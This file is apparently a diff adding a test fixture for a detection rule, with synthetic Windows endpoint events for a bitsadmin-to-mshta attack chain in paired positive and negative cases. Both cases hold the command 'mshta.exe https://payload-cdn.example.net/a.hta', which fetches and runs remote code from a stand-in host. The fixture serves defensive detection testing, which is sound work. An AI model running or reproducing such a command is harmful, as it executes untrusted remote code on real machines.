@@ -1,0 +1,148 @@
+{
+  "rule": {
+    "source": "prebuilt",
+    "rule_id": "c2d90150-0133-451c-a783-533e736c12d7"
+  },
+  "chain": "bits-mshta",
+  "step": "mshta HTTP",
+  "positive": {
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -125,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "start",
+            "kind": "event"
+          },
+          "host": {
+            "name": "wks-jordan-04",
+            "id": "azqa-wks-jordan-04",
+            "os": {
+              "type": "windows",
+              "family": "windows"
+            },
+            "hostname": "wks-jordan-04"
+          },
+          "user": {
+            "name": "jordan.park",
+            "domain": "CORP",
+            "id": "S-1-5-21-1111-2222-3333-1105"
+          },
+          "process": {
+            "name": "mshta.exe",
+            "executable": "C:\\Windows\\System32\\mshta.exe",
+            "command_line": "mshta.exe https://payload-cdn.example.net/a.hta",
+            "args": [
+              "mshta.exe",
+              "https://payload-cdn.example.net/a.hta"
+            ],
+            "entity_id": "azqa-mshta-001",
+            "parent": {
+              "name": "bitsadmin.exe",
+              "executable": "C:\\Windows\\System32\\bitsadmin.exe",
+              "entity_id": "azqa-bitsadmin.exe-826381"
+            }
+          }
+        }
+      },
+      {
+        "stream": "logs-endpoint.events.network",
+        "at": -120,
+        "doc": {
+          "event": {
+            "category": [
+              "network"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "connection_attempted",
+            "kind": "event"
+          },
+          "host": {
+            "name": "wks-jordan-04",
+            "id": "azqa-wks-jordan-04",
+            "os": {
+              "type": "windows",
+              "family": "windows"
+            },
+            "hostname": "wks-jordan-04"
+          },
+          "user": {
+            "name": "jordan.park"
+          },
+          "process": {
+            "name": "mshta.exe",
+            "executable": "C:\\Windows\\System32\\mshta.exe",
+            "entity_id": "azqa-mshta-001"
+          },
+          "destination": {
+            "ip": "203.0.113.50",
+            "port": 443,
+            "domain": "payload-cdn.example.net"
+          },
+          "network": {
+            "direction": "egress"
+          }
+        }
+      }
+    ]
+  },
+  "negative": {
+    "twin_delta": "mshta starts but never opens a network connection (no sequence completion)",
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -125,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "start",
+            "kind": "event"
+          },
+          "host": {
+            "name": "wks-jordan-04",
+            "id": "azqa-wks-jordan-04",
+            "os": {
+              "type": "windows",
+              "family": "windows"
+            },
+            "hostname": "wks-jordan-04"
+          },
+          "user": {
+            "name": "jordan.park",
+            "domain": "CORP",
+            "id": "S-1-5-21-1111-2222-3333-1105"
+          },
+          "process": {
+            "name": "mshta.exe",
+            "executable": "C:\\Windows\\System32\\mshta.exe",
+            "command_line": "mshta.exe https://payload-cdn.example.net/a.hta",
+            "args": [
+              "mshta.exe",
+              "https://payload-cdn.example.net/a.hta"
+            ],
+            "entity_id": "azqa-mshta-001",
+            "parent": {
+              "name": "bitsadmin.exe",
+              "executable": "C:\\Windows\\System32\\bitsadmin.exe",
+              "entity_id": "azqa-bitsadmin.exe-826381"
+            }
+          }
+        }
+      }
+    ]
+  }
+}
